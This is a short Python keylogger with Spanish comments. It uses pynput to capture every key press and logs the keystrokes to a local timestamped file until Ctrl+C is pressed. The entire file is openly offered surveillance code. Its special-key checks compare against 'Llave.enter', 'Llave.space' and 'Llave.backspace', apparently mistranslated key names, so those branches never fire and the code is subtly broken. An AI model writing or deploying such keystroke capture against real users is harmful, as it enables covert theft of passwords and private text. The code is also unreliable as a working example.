import datetime
from pynput.keyboard import Listener

x = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')

p = open(f'keylogger_{x}', 'w')

def registro(llave):
    llave = str(llave)

    if llave == "'\\x03'":
        # Terminar el registro 
        p.close()
        quit()
    elif llave == 'Llave.enter':
        # Salto de página
        p.write('\n')
    elif llave == 'Llave.space':
        # Espacio
        p.write(' ')
    elif llave == 'Llave.backspace':
        p.write('%BORRAR%')
    else:
        p.write(llave.replace("'",""))

with Listener(on_press=registro) as u:
    u.join() 


